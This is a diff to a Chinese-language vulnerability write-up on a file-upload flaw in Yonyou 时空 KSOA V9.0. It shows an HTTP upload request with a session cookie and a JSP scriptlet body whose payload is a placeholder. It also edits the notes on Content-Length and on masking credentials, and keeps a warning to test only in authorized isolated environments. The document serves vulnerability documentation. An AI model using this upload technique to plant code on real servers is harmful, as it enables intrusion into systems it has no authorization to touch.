@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -84,13 +84,14 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
 Cookie: JSESSIONID=825A011F31259CCA1649D5DF4849635E
 Connection: close
+Content-Length: 1
 
 <%!
 your-payload
 %>
 ```
 
-> 请求长度说明：原资料 Content-Length 为 1；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 1；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20230601102530120](./.resource/用友时空-KSOA-V9.0-文件上传漏洞/media/image-20230601102530120.png)
 
